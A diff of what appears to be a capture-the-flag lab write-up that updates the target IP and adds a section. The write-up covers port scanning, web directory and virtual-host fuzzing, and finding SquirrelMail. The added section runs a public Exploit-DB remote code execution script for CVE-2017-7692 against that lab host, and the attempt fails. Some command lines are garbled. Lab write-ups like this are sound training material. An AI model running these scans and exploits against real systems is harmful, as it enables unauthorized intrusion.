@@ -1,10 +1,10 @@
-# 10.65.171.83
+# 10.65.165.138
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/448e522f-cf65-4bc4-89a5-ef80eb7bcc50/image.png)
 
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo docker run --rm --name rustscan --net=host rustscan/rustscan -a 10.65.171.83
+└─$ sudo docker run --rm --name rustscan --net=host rustscan/rustscan -a 10.65.165.138
 Unable to find image 'rustscan/rustscan:latest' locally
 latest: Pulling from rustscan/rustscan
 582df0bcf6ab: Pull complete 
@@ -26,30 +26,30 @@ To scan or not to scan? That is the question.
 [~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
-Open 10.65.171.83:22
-Open 10.65.171.83:80
-Open 10.65.171.83:110
-Open 10.65.171.83:143
-Open 10.65.171.83:139
-Open 10.65.171.83:445
+Open 10.65.165.138:22
+Open 10.65.165.138:80
+Open 10.65.165.138:110
+Open 10.65.165.138:143
+Open 10.65.165.138:139
+Open 10.65.165.138:445
 [~] Starting Script(s)
 [~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 07:26 UTC
 Initiating Ping Scan at 07:26
-Scanning 10.65.171.83 [2 ports]
+Scanning 10.65.165.138 [2 ports]
 Completed Ping Scan at 07:26, 0.20s elapsed (1 total hosts)
 Initiating Parallel DNS resolution of 1 host. at 07:26
 Completed Parallel DNS resolution of 1 host. at 07:26, 0.01s elapsed
 DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
 Initiating Connect Scan at 07:26
-Scanning 10.65.171.83 [6 ports]
-Discovered open port 110/tcp on 10.65.171.83
-Discovered open port 80/tcp on 10.65.171.83
-Discovered open port 143/tcp on 10.65.171.83
-Discovered open port 22/tcp on 10.65.171.83
-Discovered open port 445/tcp on 10.65.171.83
-Discovered open port 139/tcp on 10.65.171.83
+Scanning 10.65.165.138 [6 ports]
+Discovered open port 110/tcp on 10.65.165.138
+Discovered open port 80/tcp on 10.65.165.138
+Discovered open port 143/tcp on 10.65.165.138
+Discovered open port 22/tcp on 10.65.165.138
+Discovered open port 445/tcp on 10.65.165.138
+Discovered open port 139/tcp on 10.65.165.138
 Completed Connect Scan at 07:26, 0.20s elapsed (6 total ports)
-Nmap scan report for 10.65.171.83
+Nmap scan report for 10.65.165.138
 Host is up, received syn-ack (0.20s latency).
 Scanned at 2025-11-30 07:26:47 UTC for 0s
 
@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 
 
 ──(kali㉿kali)-[~]
-└─$ http http://10.65.171.83                    
+└─$ http http://10.65.165.138                    
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
 Connection: Keep-Alive
@@ -105,10 +105,10 @@ Vary: Accept-Encoding
 
 > path
 
-ffuf -u http://10.65.171.83/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-Content/common.txt
+ffuf -u http://10.65.165.138/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-Content/common.txt
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo ffuf -u http://10.65.171.83/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+└─$ sudo ffuf -u http://10.65.165.138/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -121,7 +121,7 @@ ffuf -u http://10.65.171.83/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-C
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.65.171.83/FUZZ
+ :: URL              : http://10.65.165.138/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -145,7 +145,7 @@ squirrelmail            [Status: 301, Size: 319, Words: 20, Lines: 10, Duration:
 > /admin
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo http http://10.65.171.83/admin/
+└─$ sudo http http://10.65.165.138/admin/
 HTTP/1.1 403 Forbidden
 Connection: Keep-Alive
 Content-Length: 277
@@ -161,21 +161,21 @@ Server: Apache/2.4.18 (Ubuntu)
 <h1>Forbidden</h1>
 <p>You don't have permission to access this resource.</p>
 <hr>
-<address>Apache/2.4.18 (Ubuntu) Server at 10.65.171.83 Port 80</address>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.65.165.138 Port 80</address>
 </body></html>
 
 
 > squirrelmail
                                                                                                                           
 ┌──(kali㉿kali)-[~]
-└─$ sudo http http://10.65.171.83/squirrelmail
+└─$ sudo http http://10.65.165.138/squirrelmail
 HTTP/1.1 301 Moved Permanently
 Connection: Keep-Alive
 Content-Length: 319
 Content-Type: text/html; charset=iso-8859-1
 Date: Sun, 30 Nov 2025 07:43:34 GMT
 Keep-Alive: timeout=5, max=100
-Location: http://10.65.171.83/squirrelmail/
+Location: http://10.65.165.138/squirrelmail/
 Server: Apache/2.4.18 (Ubuntu)
 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -183,9 +183,9 @@ Server: Apache/2.4.18 (Ubuntu)
 <title>301 Moved Permanently</title>
 </head><body>
 <h1>Moved Permanently</h1>
-<p>The document has moved <a href="http://10.65.171.83/squirrelmail/">here</a>.</p>
+<p>The document has moved <a href="http://10.65.165.138/squirrelmail/">here</a>.</p>
 <hr>
-<address>Apache/2.4.18 (Ubuntu) Server at 10.65.171.83 Port 80</address>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.65.165.138 Port 80</address>
 </body></html>
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/7ffe0334-e834-4649-9191-1e219af9be1b/image.png)
@@ -193,7 +193,7 @@ Server: Apache/2.4.18 (Ubuntu)
 
 ```html
 ┌──(kali㉿kali)-[~]
-└─$ curl -L http://10.65.171.83/squirrelmail
+└─$ curl -L http://10.65.165.138/squirrelmail
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 
 <html>
@@ -516,7 +516,7 @@ echo -e "\n[*] All done. Exiting"
 > subdomain -> nothing
 
 ┌──(kali㉿kali)-[~]
-└─$ sudosudo ffuf -up://10.65.171.83 -H "-H "Host: FUZZ.10.65.171.83" -osts.txt -w /-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+└─$ sudosudo ffuf -up://10.65.165.138 -H "-H "Host: FUZZ.10.65.165.138" -osts.txt -w /-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 
 
         /'___\  /'___\           /'___\       
@@ -530,9 +530,9 @@ echo -e "\n[*] All done. Exiting"
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.65.171.83
+ :: URL              : http://10.65.165.138
  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.10.65.171.83
+ :: Header           : Host: FUZZ.10.65.165.138
  :: Output file      : vhosts.txt
  :: File format      : json
  :: Follow redirects : false
@@ -543,4 +543,72 @@ ________________________________________________
 ________________________________________________
 
 
-                                                                                                           
+
+>  /usr/share/exploitdb/exploits/linux/remote/41910.sh                                                                           
+
+┌──(kali㉿kali)-[~]
+└─$ sudosudo /usr/share/exploitdb/exploits/linux/remote/41910.sh 
+[sudo] password for kali: 
+
+     __                     __   __  __           __
+    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
+   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
+  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
+ /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
+           /____/
+
+SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
+
+SquirrelMail_RCE_exploit.sh (ver. 1.1)
+
+Discovered and coded by
+
+Dawid Golunski (@dawid_golunski)
+https://legalhackers.com
+
+ExploitBox project:
+https://ExploitBox.io
+
+
+Usage: 
+/usr/share/exploitdb/exploits/linux/remote/41910.sh SquirrelMail_URL
+Example: 
+/usr/share/exploitdb/exploits/linux/remote/41910.sh http://target/squirrelmail/ 
+
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ sudo /usr/share/exploitdb/exploits/linux/remote/41910.sh http://10.65.165.138/squireelmail/
+
+     __                     __   __  __           __
+    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
+   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
+  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
+ /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
+           /____/
+
+SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
+
+SquirrelMail_RCE_exploit.sh (ver. 1.1)
+
+Discovered and coded by
+
+Dawid Golunski (@dawid_golunski)
+https://legalhackers.com
+
+ExploitBox project:
+https://ExploitBox.io
+
+
+
+[*] Enter SquirrelMail user credentials
+user: 
+pass: 
+
+[*] Logging in to SquirrelMail at http://10.65.165.138/squireelmail/
+
+
+[*] Uploading Sendmail config
+Something went wrong. Failed to upload the sendmail file.
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ clear     
